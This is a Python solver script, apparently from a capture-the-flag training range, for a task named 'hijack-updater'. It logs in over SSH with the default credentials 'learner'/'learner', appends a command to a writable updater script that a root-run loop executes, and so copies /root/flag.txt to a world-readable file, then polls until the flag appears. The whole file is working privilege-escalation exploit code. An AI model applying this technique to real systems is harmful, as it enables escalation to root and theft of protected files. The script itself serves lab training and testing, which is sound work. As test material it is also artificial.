"""Intended-path solver: writable updater payload executed by the root loop."""

import time
import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

APPEND = (
    "echo 'cp /root/flag.txt /tmp/flag.out && chmod 644 /tmp/flag.out' "
    ">> /opt/services/updater/bin/uhelper.sh"
)
READ = "cat /tmp/flag.out 2>/dev/null || true"
POLL_SECONDS = 45
TICK_SECONDS = 3


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    captured = None
    try:
        _, _, stderr = client.exec_command(APPEND, timeout=10)
        if stderr.read().strip():
            detail = "failed to append to the updater payload"
            client.close()
            return SolveResult(
                results=[TaskResult(task_id="hijack-updater", ok=False, detail=detail)]
            )

        deadline = time.monotonic() + POLL_SECONDS
        while time.monotonic() < deadline:
            _, stdout, _ = client.exec_command(READ, timeout=10)
            out = stdout.read().decode(errors="replace")
            flags = find_flags(out)
            if flags:
                captured = flags[0]
                break
            time.sleep(TICK_SECONDS)
    finally:
        client.close()

    detail = None if captured else f"root loop never delivered the flag within {POLL_SECONDS}s"
    return SolveResult(
        results=[
            TaskResult(
                task_id="hijack-updater", ok=captured is not None, captured=captured, detail=detail
            )
        ]
    )
